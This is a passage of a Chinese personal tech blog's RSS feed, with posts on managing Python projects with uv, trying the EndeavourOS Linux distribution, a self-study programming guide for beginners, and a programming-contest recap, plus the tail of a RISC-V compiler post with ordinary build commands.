&lt;pre&gt;&lt;code&gt;clang hello.S -c -o hello.o -target riscv32-unknown-linux-elf -march=rv32im -mabi=ilp32
ld.lld hello.o -L$CDE_LIBRARY_PATH/riscv32 -lsysy -o hello
qemu-riscv32-static hello
&lt;/code&gt;&lt;/pre&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Tue, 12 Aug 2025 16:00:00 GMT</pubDate></item><item><title>Python项目结构与管理 | Python</title><link>https://tankimzeg.top/blog/rust/uv-pyproject/</link><guid isPermaLink="true">https://tankimzeg.top/blog/rust/uv-pyproject/</guid><description>学习一下Python项目结构,以及如何使用uv管理Python项目.</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/rust/uv-pyproject/&quot;&gt;https://tankimzeg.top/blog/rust/uv-pyproject/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;随着我写的项目越来越多,我越加感受到一种组织项目结构的&amp;quot;强迫症&amp;quot;.项目的目录应该是什么样子,才能方便调用和维护?这其实是软件工程研究的领域.由于我从未系统学习过软件工程,以前的我反复琢磨,总感觉不是最佳实践,浑身难受!&lt;/p&gt;
&lt;p&gt;但是现在,我宣布我已经悟了!&lt;/p&gt;
&lt;h2&gt;从脚本到模块，从混乱到整洁&lt;/h2&gt;
&lt;p&gt;梦开始之前,功能需求小,加上Python语言的极致胶水感🤭,在一个py文件里写一些类就足够了.或者顶多就像这样&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;my_project/
├── main.py
├── helper.py
├── test_data.csv
├── output.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;后来不知道从哪里看到了有人用 &lt;code&gt;__init__.py&lt;/code&gt; 文件,一番了解之后,非常兴奋,这简直完美适用于我日益增长的需求!马上就开始实战了.这期间与无数 &lt;code&gt;ModuleNotFound&lt;/code&gt;错误斗智斗勇,又被C语言里面的循环导入绕晕,总算是有了一点基本的项目结构意识.然后就变成这个样子:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;my_project/
├── .venv/
├── module1/
|	├── __init__.py
|	├── main.py
|	├── utils.py
|	├── logger.py
├── module2/
|	├── __init__.py
|	├── main.py
|	├── utils.py
├── main.py
├── logs/
├── requirements.txt
├── .gitignore
├── README.md
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我长期保持着这种风格,通过 &lt;code&gt;pip freeze &amp;gt; ./requirements.txt&lt;/code&gt;来生成依赖.不涉及打包的话,这样其实也过得去,那些搞深度学习的项目就长这样.我也一直觉得轻松可接受.&lt;/p&gt;
&lt;p&gt;直到最近我学了Rust,发现Cargo竟有如此强大的功能,测试功能也爽得不得了,&amp;quot;库&amp;quot;和&amp;quot;包&amp;quot;的区别也引发我的思考.&lt;/p&gt;
&lt;p&gt;大概是年初的时候我听说了uv,当时对项目了思考还不够,所以觉得它跟conda应该差不多吧.既然我有conda了没有必要再装一个吧,conda已经相当臃肿了.最近看到几个视频,我认真看了,才了解到pip生成requirements.txt的缺点以及uv能做的事情:跟Cargo差不多,是&amp;quot;项目管理器&amp;quot;而不只是&amp;quot;包管理器&amp;quot;!&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.bilibili.com/video/BV13WGHz8EEz&quot;&gt;从pip到uv：一口气梳理现代Python项目管理全流程！&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.bilibili.com/video/BV12NgLzhEKx&quot;&gt;build + hatchling 15分钟搞懂Python项目结构和打包&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;悟已往之不谏,知来者之可追!&lt;/strong&gt;&lt;/p&gt;
&lt;h1&gt;uv使用&lt;/h1&gt;
&lt;p&gt;技术以我们难以追赶的速度更新迭代,热情拥抱新技术,是像我这样的编程爱好者必须的品质!
事不宜迟,马上入手!&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://uv.doczh.com/&quot;&gt;uv - 一个用 Rust 编写的极速 Python 包和项目管理工具。&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;最近vscode的ms-python插件抽风了,导致我的虚拟环境和tasks任务也出问题.一看Github上面一堆issue,维护者告诉我们暂时下载一个python env插件来解决.为了体验uv,我干脆删掉了原来用 &lt;code&gt;python -m venv .env&lt;/code&gt;创建的虚拟环境,重构目录结构.&lt;/p&gt;
&lt;p&gt;为了采用新式项目管理,首先运行:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;uv init
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;会自动生成pyproject.toml&lt;/p&gt;
&lt;p&gt;然后看看pylace报了哪些模块缺失错误,逐个运行&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;uv add package
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;来安装.这些依赖被自动添加到了pyproject.toml里面,跟Cargo add ,npm install是一样的.&lt;/p&gt;
&lt;h2&gt;src layout布局与打包&lt;/h2&gt;
&lt;p&gt;src layout布局:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sampleproject
├── scripts/
├── src/
|    └── package_name/
|         ├── __init__.py 
|		  └── utils.py
├── pyproject.toml 
└── tests/
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这是越来越多新项目的项目布局,其中src里面是打包的对象.&lt;/p&gt;
&lt;p&gt;我把项目调整为这样之后,在pyproject.toml里面添加hatchling作为打包工具(默认为setuptool)的配置后,运行&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;uv pip install -e .
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;把我们开发的包本身安装到虚拟环境中&lt;/p&gt;
&lt;p&gt;生成压缩文件和wheel:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;uv build
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/uv-pyproject_build.png&quot; alt=&quot;build&quot;&gt;
这些wheel是可以通过pip来安装的:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;uv pip install dist/package_name.whl
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;uv换源&lt;/h2&gt;
&lt;p&gt;不是说uv很快吗?怎么下载速度比pip install还慢?甚至Timeout?其实他们用的是同一个源,都来自pypi,跟conda有自己的源是不一样的.&lt;/p&gt;
&lt;p&gt;换源的步骤是设置系统环境变量:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;UV_DEFAULT_INDEX=https://pypi.mirrors.ustc.edu.cn/simple/
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;话说清华源是不是不好用了,换成清华源的话会出现403;之前搞Arch mirror_list 清华源好像也有问题,推荐科大源吧&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;一个简单的前后端项目&lt;/h2&gt;
&lt;p&gt;最近在写一个&lt;a href=&quot;https://github.com/TanKimzeg/PP4mat&quot;&gt;论文格式检测&lt;/a&gt;项目.小项目没有历史包袱,我将其按以上方式重构,检测部分是可复用的逻辑,所以我把它放在src/pp4mat里面,能被打包.在Copilot的帮助下增加了前后端.后端在 &lt;code&gt;app&lt;/code&gt; 里面,用fastapi处理请求.前端在 &lt;code&gt;frontend&lt;/code&gt; 里面,主要是一个网页和JS. 没想到有一天我也能搞全栈开发了haha,天才如我😆.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;pp4mat_detection
├── app/
|   ├── api/
|   ├── services/
|   ├── __init__.py
|   └── main.py 
├── src/
|    └── pp4mat/
|         ├── __init__.py 
|		  ├── main.py
|         ├── check_format/
|         └── config_convert/
├── frontend/
|    ├── node_modules
|    └── index.html
├── configs
|    └── rules.yaml
├── pyproject.toml 
├── .gitignore
├── README.md
└── tests/
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/uv-pyproject_frontend.png&quot; alt=&quot;frontend&quot;&gt;
前后端逻辑比较简单,所以把Copilot提供的代码修修就行.目前前端看起来还比较简陋,后面会做美化!&lt;/p&gt;
&lt;p&gt;import RepositoryCard from &amp;quot;@/components/mdx/RepositoryCard.astro&amp;quot;;&lt;/p&gt;
&lt;RepositoryCard repo=&quot;TanKimzeg/PP4mat&quot; /&gt;</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Mon, 28 Jul 2025 00:00:00 GMT</pubDate></item><item><title>EndeavourOS体验 | Arch</title><link>https://tankimzeg.top/blog/distro/new-in-endeavouros/</link><guid isPermaLink="true">https://tankimzeg.top/blog/distro/new-in-endeavouros/</guid><description>EndeavourOS是Arch Linux的衍生版，主打轻量简洁，但又解决了Arch安装复杂的问题。用户选择它通常是因为想要Arch的滚动更新和软件库，又不想折腾安装过程。</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/distro/new-in-endeavouros/&quot;&gt;https://tankimzeg.top/blog/distro/new-in-endeavouros/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;厌倦了臃肿的系统，又对 Arch Linux 的安装门槛望而却步？那么，&lt;strong&gt;EndeavourOS&lt;/strong&gt; 可能就是你的理想选择！&lt;/p&gt;
&lt;p&gt;它并非又一个“简单版 Arch”，而是秉承 Arch 哲学精髓的优雅继承者：&lt;strong&gt;轻量、滚动更新、软件包丰富（得益于 AUR）&lt;/strong&gt;。EndeavourOS 的核心目标非常明确：&lt;strong&gt;为你提供一个近乎纯净的 Arch Linux 基础，同时通过一个极其友好的图形安装程序（Calamares），彻底扫除安装 Arch 的最大障碍。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;安装后，你将获得一个&lt;strong&gt;清爽、快速、高度可定制&lt;/strong&gt;的桌面环境（默认是精心调校过的 KDE，但也提供多种流行桌面选项）。没有预装大量你可能不需要的软件，系统将掌控权完全交还给你。你可以通过便捷的包管理工具 &lt;code&gt;pacman&lt;/code&gt; 和 &lt;code&gt;yay&lt;/code&gt; ，轻松访问 Arch 庞大的软件仓库和用户仓库（AUR），构建属于你自己的专属系统。&lt;/p&gt;
&lt;h2&gt;安装&lt;/h2&gt;
&lt;p&gt;在&lt;a href=&quot;https://endeavouros.com/&quot;&gt;官网&lt;/a&gt;中找到自己所在区域下载ISO，然后，就可以像Ubuntu/Kali等发行版那样进入图形化安装界面，顺便配置好镜像源，非常简单省事！离线默认安装KDE桌面，而且自带水星太空主题，很美观嘛：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/EndeavourOS-login-plasma.png&quot; alt=&quot;login-plasma&quot;&gt;&lt;/p&gt;
&lt;p&gt;每次开机后，自动会出现一个Welcome向导，充满新手关怀：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/EndeavourOS-welcome.png&quot; alt=&quot;welcome&quot;&gt;&lt;/p&gt;
&lt;h2&gt;丰富的软件生态&lt;/h2&gt;
&lt;p&gt;与majargo有自己的软件仓库不同，Endeavouros完全就是用Arch的软件仓库。&lt;code&gt;yay&lt;/code&gt;则能从AUR装软件包。&lt;/p&gt;
&lt;p&gt;Arch的软件生态真是独一档。&lt;code&gt;pacman&lt;/code&gt; 包管理器从&lt;a href=&quot;https://archlinux.org/packages/&quot;&gt;官方的软件仓库&lt;/a&gt;搜索软件包。这里的软件包开源可靠稳定的。&lt;/p&gt;
&lt;p&gt;我一开始在这边安装了vscode，结果发现是那个开源版的vscode。而平时用到vscode与此不同，随后我发现它在&lt;a href=&quot;https://aur.archlinux.org/&quot;&gt;AUR&lt;/a&gt;里面。&lt;/p&gt;
&lt;p&gt;为了便捷安装AUR的软件包，我发现了一个类似于 &lt;code&gt;pacman&lt;/code&gt; 的包管理器 &lt;code&gt;yay&lt;/code&gt;。作为补充，它能自动安装AUR的软件包。用法也与 &lt;code&gt;pacman&lt;/code&gt;相同。&lt;/p&gt;
&lt;p&gt;我们可以先搜索一下软件包的名字：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/EndeavourOS-packages.png&quot; alt=&quot;packages&quot;&gt;&lt;/p&gt;
&lt;p&gt;找到真正想要的那一个
&lt;img src=&quot;https://tankimzeg.top/attachments/EndeavourOS-AUR.png&quot; alt=&quot;AUR&quot;&gt;
在网页里面看更方便准确。&lt;/p&gt;
&lt;p&gt;之前在NixOS里面想用V2rayN，结果发现无法自动配置系统代理。搞了很久才明白是不支持Xfce桌面的系统代理。而且连浏览器里面不能设置浏览器的代理，真是一个致命缺陷！相比之下，虽然Gnome和KDE资源占用较多，但还是受主流支持。&lt;/p&gt;
&lt;p&gt;这次，在AUR里面找到V2rayN并安装，非常顺利就设置好了代理。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;pacman&lt;/code&gt;还是很好用的，常用的命令就那几个。我这边一个月没滚动更新了，运行一下&lt;code&gt;sudo pacman -Syu&lt;/code&gt;也没有挂。所以我觉得只要不去折腾太多的不稳定的插件和软件包，也没有那么容易滚挂吧...&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/EndeavourOS-pacman-Syu.png&quot; alt=&quot;EndeavourOS-pacman-Syu&quot;&gt;&lt;/p&gt;
&lt;h2&gt;详细的文档&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://wiki.archlinuxcn.org/wiki/%E9%A6%96%E9%A1%B5&quot;&gt;Arch Wiki&lt;/a&gt;的文档真是非常详实。&lt;/p&gt;
&lt;p&gt;比如我现在想把bash换成zsh，直接在Arch Wiki里面搜索&lt;a href=&quot;https://wiki.archlinuxcn.org/wiki/Zsh&quot;&gt;zsh&lt;/a&gt;，就教你怎么换默认shell，甚至zsh的第三方拓展也给你指明了它们的项目地址，配置起来还是非常高效的。&lt;/p&gt;
&lt;h2&gt;Zsh的配置&lt;/h2&gt;
&lt;p&gt;Zsh支持Vim motion！那么我们初始化zsh之后，就去Github上的oh-my-zsh项目，按照README的指示下载并激活了oh-my-zsh。在~/.zshrc里面，我先置 &lt;code&gt;ZSH_THEME=&amp;quot;random&amp;quot;&lt;/code&gt;，出来&lt;code&gt;source ~/.zshrc&lt;/code&gt;一下，给我加载了一个叫做lukerandall的主题，看起来挺美观的，就它了：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/EndeavourOS-lukerandall-theme.png&quot; alt=&quot;EndeavourOS-lukerandall-theme&quot;&gt;&lt;/p&gt;
&lt;p&gt;还能显示进程异常返回码，比显示时间有用😆&lt;/p&gt;
&lt;p&gt;我安装的其他插件，都用oh-my-zsh管理：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/zsh-users/zsh-autosuggestions/blob/master/INSTALL.md&quot;&gt;zsh autosuggestions&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/zsh-users/zsh-syntax-highlighting/blob/master/INSTALL.md&quot;&gt;zsh-syntax-highlighting&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Inspect&lt;/h2&gt;
&lt;p&gt;终端模拟器这块，KDE自带Konsole，但是感觉没Windows的终端好用啊，也不能设置透明度啥的。想找一个更好的替代品。&lt;/p&gt;
&lt;p&gt;还有各种分屏快捷键，都得配好，才能用得顺手。中文输入法也还没搞，下次再说吧！&lt;/p&gt;
&lt;p&gt;上次试用了NixOS,构建速度慢，网络问题多，软件包少，有的得自己打包，也就是要自己编写nix代码厘清依赖关系。上次发现xfce的系统代理问题后我想切换成GNOME，结果&lt;code&gt;nixos build&lt;/code&gt;就一直失败，实在太折腾了。EndeavourOS给我的体验很不错。我不想把精力花在这些琐事上，还是Arch系的发行版省心。&lt;/p&gt;
&lt;p&gt;前段时间我萌生了自己配一台台式电脑的念头，然后装上纯Linux操作系统来作为开发主力机。所以我开始关注硬件市场，学着去了解主板、CPU、显卡，已经有了自己一套“高性价比”配置方案🤓，跃跃欲试了。
都用Linux了，内核资源占用少，软件轻量，自然无需高配置。CPU的话5700X看起来不错。搞深度学习只好用皮衣黄的东西。不想买矿卡又买不起40系，只好先弄一块亮机卡，偶尔还能玩玩游戏。其实这个想法有点冲动了，买了没地方放。刚好这几个月以来内存条和机械硬盘都大涨，只能再忍一手了。我估计明年局势明朗，到时候如果能拿下，我肯定把装机过程详细记录一下，敬请期待哦！&lt;/p&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Thu, 24 Jul 2025 16:00:00 GMT</pubDate></item><item><title>给初学者的编程自学经验</title><link>https://tankimzeg.top/blog/coding-guide/</link><guid isPermaLink="true">https://tankimzeg.top/blog/coding-guide/</guid><description>本文原为我给社团写的新生入门指南，现作删改，发表于此。</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/coding-guide/&quot;&gt;https://tankimzeg.top/blog/coding-guide/&lt;/a&gt;&lt;/blockquote&gt; &lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;只要你对计算机的知识感兴趣，欢迎你和我一起学习。我希望带你少走弯路，带你见识计算机世界的丰富多彩，相信你会找到感兴趣的领域。自学之余，感受计算机技术的魅力。&lt;/p&gt;
&lt;p&gt;无论你想学习后端还是前端技术、计算机底层原理还是新兴的深度学习领域，都离不开编程的能力。在上大学之前，在应试教育的体制下少有人能称得上具有“编程能力”，即使高中接触过算法竞赛，也不一定真正了解该编程语言、具备做工程的能力。所以，完全可以假设大家都在同一水平。那为什么有的人能够在几年间一跃成为大牛，有的人Steam都装不上呢？我认为首先要培养观察问题和解决问题的能力。&lt;/p&gt;
&lt;p&gt;作为一门工科，不像数学和理论物理，它是只要方法得当，时间投入，就能掌握的，完全不用感到如临大敌。在编程任务中，我们不可能像Linus那样一遍写对，难免疏漏遇到错误。不要一看到错误和英语就丧失了阅读的能力，比如下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/coding-guide-1.png&quot; alt=&quot;神秘的常见错误&quot;&gt;&lt;/p&gt;
&lt;p&gt;即使这是你从未接触的编程语言，你仍然能够从编译错误信息中得知发生了什么，以及如何修复。红色信息说 &lt;code&gt;expected UnoCard, found &amp;amp;UnoCard&lt;/code&gt;，绿色信息说在在 &lt;code&gt;Some(card)&lt;/code&gt; 中加上星号。我们照做，果然修复了。&lt;/p&gt;
&lt;p&gt;接着你注意到蓝色的help信息： &lt;code&gt;consider dereferencing the borrow&lt;/code&gt; ，假如你被临时按进了这一世界公认的最难编程语言的Debug工作里，又不想像专业的开发人员那样翻阅文档，你可以向DeepSeek提问：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/coding-guide-2.png&quot; alt=&quot;学会提问题&quot;&gt;&lt;/p&gt;
&lt;p&gt;如果他说出了更多你不懂的东西，你可以继续追问，但他讲的故事也可能不对，或者由于幻觉故意绕晕你。你会进一步求助于CSDN等快餐。随着水平的提升，文档才是学习的归宿：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/coding-guide-3.png&quot; alt=&quot;寻找解决方法&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;顺便提一句，把搜索引擎从百度换成必应&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;不要小看这些习惯，它能决定自学之路的效率和信心。&lt;/p&gt;
&lt;p&gt;接下来，我要开始介绍学编程的经验。&lt;/p&gt;
&lt;h2&gt;Hello, world之前&lt;/h2&gt;
&lt;p&gt;我推荐先学习C语言，再学习Python，然后你就可以游刃有余地去学习与你兴趣方向相关的技术栈和其他语言了。&lt;/p&gt;
&lt;p&gt;选择一本好教程，例如《C语言程序设计：现代方法》。&lt;/p&gt;
&lt;p&gt;选择新手友好的IDE: Red Panda C++。有的人会让你下载Dev-C++，但它已经十多年不再维护更新了，没有代码补全，有时会出现莫名其妙的Bug。有的人会向你推荐VSCode，但他们当年也许曾被环境配置难倒。我很幸运听说了这一小众免费开箱即用的IDE，给初学时的我很大帮助，这里推荐给大家。&lt;/p&gt;
&lt;p&gt;当你输入一些莫名其妙的字母，最终出现黑窗口显式 &lt;code&gt;Hello, world!&lt;/code&gt;时，不知道是什么心情？反正我没有那么激动，而是出现了更多的困惑。多年以后，我才认识到&lt;code&gt;printf&lt;/code&gt;函数的复杂程度。&lt;/p&gt;
&lt;h2&gt;Hello, world之后&lt;/h2&gt;
&lt;p&gt;正如我上面所说，&lt;code&gt;Hello, world&lt;/code&gt;之后我们有了更多困惑，至少IDE的这个界面和功能是值得探索的&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/coding-guide-4.png&quot; alt=&quot;Red Panda C++界面&quot;&gt;&lt;/p&gt;
&lt;p&gt;Release和Debug有什么区别？调试功能怎么用？编译、优化级别、Makefile又是什么意思？&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/coding-guide-5.png&quot; alt=&quot;项目编译选项&quot;&gt;&lt;/p&gt;
&lt;p&gt;试试对刚刚的hello world程序”生成汇编“呢？如果你着迷的话，可以了解一下逆向。这只是一个例子，希望你能建立探索的欲望。&lt;/p&gt;
&lt;p&gt;在学C语言的同时，顺便学一些简单数据结构，例如栈、队列、链表、堆（树）。写成自己的库，要用的时候直接调用，这样就解决了”学了有什么用“的疑问。最后用一个小项目来练手，比如带历史记录管理的复数四则运算计算器。&lt;/p&gt;
&lt;p&gt;学到内存分配之后，只需简单了解，不用去纠结C语言的文件IO。另外希望你了解一下如何编写多文件项目以及项目编译的过程。这样以上的问题应该都能回答了。&lt;/p&gt;
&lt;p&gt;以后你会明白，C语言才是计算机与人类交互中最直白的语言。Linus说，他看C代码就好像能直接看到汇编，这就是大神的技术境界！&lt;/p&gt;
&lt;h2&gt;在Python中学习程序设计的艺术&lt;/h2&gt;
&lt;p&gt;你肯定在C语言编程的过程中饱受折磨，有时候要与编译器斗智斗勇，有时候程序异常退出却一脸懵，调试到深夜是常态。相比之下，Python的开发效率就高得多了。Python是世界公认的最简单的编程语言，但要写好Python，只会它的语法是远远不够的。Python面向对象编程，如果你不掌握程序自顶向下设计的艺术，你就无法体验到爽感，它就只是一个龟速、有Vec和HashMap、没有指针的C。在开发的过程中你将思考：如何设计高内聚低耦合的函数；包应该暴露什么接口，隐藏什么接口；某个执行逻辑应该放在外部主程序实现，还是下放到模块内实现；如何通过继承、重载写出整洁的代码；等等。作为没有系统学习过软件工程的非科班开发者，只能在实践中积累经验，慢慢体会，不断重构自己的代码。&lt;/p&gt;
&lt;p&gt;这里我还要推荐一个写Python的好习惯：写类型注释。
真是奇怪，Python好不容易摆脱了那些冗余的类型定义，可以随心所欲的在列表里面放入任何类型的元素。解释器不要求的束缚，怎么还要自己钻进去？首先这会倒逼你在动手前想好函数的作用：接收什么参数，返回什么结果。其次，在函数的签名中含有变量的更多信息提示，提供完整的代码补全功能，提升开发和维护的效率。还有就是Pylance会自动检查调用的语境，提前发现错误，省去耗费心智。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/coding-guide-6.png&quot; alt=&quot;随手找的不算太典型的类型注释示例|719x490&quot;&gt;&lt;/p&gt;
&lt;h2&gt;把Linux当玩具&lt;/h2&gt;
&lt;p&gt;微软靠着卖操作系统赚了大家很多钱，于情于理都应该回馈一些福利给世界。通过学生认证，我们可以白嫖微软提供的不错的功能和服务。例如Gihub和Azure的学生认证。怎么搞学生认证，网上有很多博客教程。&lt;/p&gt;
&lt;p&gt;通过学生认证后，租用一个&lt;a href=&quot;https://azure.microsoft.com/zh-cn/free/students/&quot;&gt;Azure云服务器&lt;/a&gt;，并且将服务器地理位置选在外国。有了一个外国公网VPS，能提供很多服务，例如Shadowsocks🚀、搭建自己的网站。当然这需要你不怕麻烦，动手操作，你将会发现黑窗口的效率和信息密度，比不断拖动鼠标高得多。&lt;/p&gt;
&lt;p&gt;Linux的可玩性非常高，进入GNU/Linux世界，发现一种不一样的可能性，享受极客的感觉。来到这一步，Vim,Git,gcc,docker等工具链都学一下；除非看得懂，否则不要轻信AI给你的shell脚本。WSL是本地的“双系统”选择。如果想折腾不同的发行版和桌面环境，可以整虚拟机。想学OS内核的要把Linux当成一个重点研究样例。&lt;/p&gt;
&lt;h2&gt;走向广阔天地&lt;/h2&gt;
&lt;p&gt;学习过以上的技术，你已经从一无所知的小白转变为了具有技术力的大学生。现在，开拓自己的眼界，选择自己感兴趣的方向去深入学习。在浩如烟海的计算机学科中，永远保持最新的视界和对新技术的热忱。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;年轻人，你渴望力量吗？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://csdiy.wiki/&quot;&gt;CS自学指南&lt;/a&gt;提供了一个总览，相信你能从中找到自己的兴趣方向。如果能学得进去两个领域，不用说在本校，就算是在985的非科班中都算优秀人才。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/codecrafters-io/build-your-own-x&quot;&gt;Build Your own X&lt;/a&gt;从头开始手搓项目&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/rasbt/LLMs-from-scratch&quot;&gt;LLMs From Scratch&lt;/a&gt;亲手搭建大语言模型&lt;/p&gt;
&lt;h2&gt;网站/小程序开发&lt;/h2&gt;
&lt;p&gt;其实我不太懂这个，但是前端确实是最容易做出实实在在能给别人看的”成果“了，开发部会承接的任务大多是此类。应此现实需求，还是要讲一下的。以上的硬核内容就算不会也不影响前端设计。比如说，你想搞一个自己的个人网站，就可以去Github上寻找开源框架，然后自己稍作修改。WordPress,Hexo,Astro等都有免费的框架。对于迷你服务器来说，无法承载动态网页，最好用静态网页（如Astro）。就算是我这样不太懂的人，就着框架改一改都是没问题的。然后购买域名，托管到Cloudflare。接着配置Nginx的路由转发规则、注册HTTPS证书。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://tankimzeg.top/blog/frosti-nginx-waline-build-website/&quot;&gt;搭建本站的过程&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;总结&lt;/h2&gt;
&lt;p&gt;我在大一下学校教C语言之前就掌握了远高于学校课程要求的C语言，所以在大一下的C语言课上就可以用电脑搞其他东西了。到了大二反而不让用任何电子设备了，简直比大一还难受。所以想在时间碎片中苦苦挣扎，掌握一项拿手本领实属不易。如果不甘心还想涉猎广泛，跟你高中的选择电子信息类的其他同学碰一碰，那基本上要牺牲大量游戏时间以及假期时间！任何一项技能都要花费大量精力，我们希望你少走弯路，也需要你避免急功近利的心态。😎&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/coding-guide-7.png&quot; alt=&quot;Peace and love&quot;&gt;&lt;/p&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Sun, 20 Jul 2025 16:00:00 GMT</pubDate></item><item><title>蓝桥杯参赛记</title><link>https://tankimzeg.top/blog/lanqiao/</link><guid isPermaLink="true">https://tankimzeg.top/blog/lanqiao/</guid><description>第一次参加蓝桥杯</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/lanqiao/&quot;&gt;https://tankimzeg.top/blog/lanqiao/&lt;/a&gt;&lt;/blockquote&gt; &lt;blockquote&gt;
&lt;p&gt;What I have is not what I want...&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在准备蓝桥杯之前，我没有受过任何ACM的学习和训练，只是学过数据结构并且满绩。我深知数据结构这种课跟算法竞赛差别还是蛮大的。今年二月份下旬，学完CS:APP，我从基础开始，跟着&lt;a href=&quot;https://space.bilibili.com/525438321/lists/180037&quot;&gt;代码随想录&lt;/a&gt;入门了基础算法题，在&lt;a href=&quot;leetcode.com&quot;&gt;国际版力扣&lt;/a&gt;上刷了一百多道题，然后就开始去蓝桥杯官网上的题库做题。苦于烂学校不但用水课浪费学生时间，还不让学生翘课，我只能用课余时间拼命刷题。从省赛到国赛，直接就贯穿了整个学期，所以我一个学期都没时间打游戏，上次这样还是在高中。哎，平时也是苦不堪言，以后再分享吧。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%8F%82%E8%B5%9B%E8%AE%B0-1751986240286.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%8F%82%E8%B5%9B%E8%AE%B0-1751986273350.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%8F%82%E8%B5%9B%E8%AE%B0-1751986749412.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;满打满算才做了两个多月，不到三个月的题，最后拿了国二，对于刚入门的我来说还算可以吧。不奢求国一了，毕竟前5%确实还是有难度的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%8F%82%E8%B5%9B%E8%AE%B0-1751986161423.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
